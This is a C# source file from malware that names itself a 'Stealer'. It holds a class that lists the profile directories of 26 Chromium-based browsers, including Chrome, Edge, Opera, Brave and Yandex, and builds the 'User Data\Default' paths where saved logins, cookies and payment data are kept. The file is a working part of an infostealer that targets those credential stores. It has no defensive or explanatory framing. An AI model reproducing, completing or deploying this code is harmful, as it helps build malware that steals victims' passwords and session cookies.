using System;

namespace Stealer;

internal sealed class Paths
{
	private static string default_appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

	private static string local_appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";

	public static string[] chromiumBasedBrowsers = new string[26]
	{
		default_appdata + "Opera Software\\Opera Stable",
		default_appdata + "Opera Software\\Opera GX Stable",
		local_appdata + "Google\\Chrome",
		local_appdata + "Google(x86)\\Chrome",
		local_appdata + "Chromium",
		local_appdata + "BraveSoftware\\Brave-Browser",
		local_appdata + "Epic Privacy Browser",
		local_appdata + "Amigo",
		local_appdata + "Vivaldi",
		local_appdata + "Orbitum",
		local_appdata + "Mail.Ru\\Atom",
		local_appdata + "Kometa",
		local_appdata + "Comodo\\Dragon",
		local_appdata + "Torch",
		local_appdata + "Comodo",
		local_appdata + "Slimjet",
		local_appdata + "360Browser\\Browser",
		local_appdata + "Maxthon3",
		local_appdata + "K-Melon",
		local_appdata + "Sputnik\\Sputnik",
		local_appdata + "Nichrome",
		local_appdata + "CocCoc\\Browser",
		local_appdata + "uCozMedia\\Uran",
		local_appdata + "Chromodo",
		local_appdata + "Yandex\\YandexBrowser",
		local_appdata + "Microsoft\\Edge\\User Data\\Default"
	};

	public static string GetUserData(string browser)
	{
		if (browser.Contains("Opera Software"))
		{
			return browser + "\\";
		}
		if (browser.Contains("MicrosoftEdge"))
		{
			return browser + "\\User\\Default\\";
		}
		return browser + "\\User Data\\Default\\";
	}
}
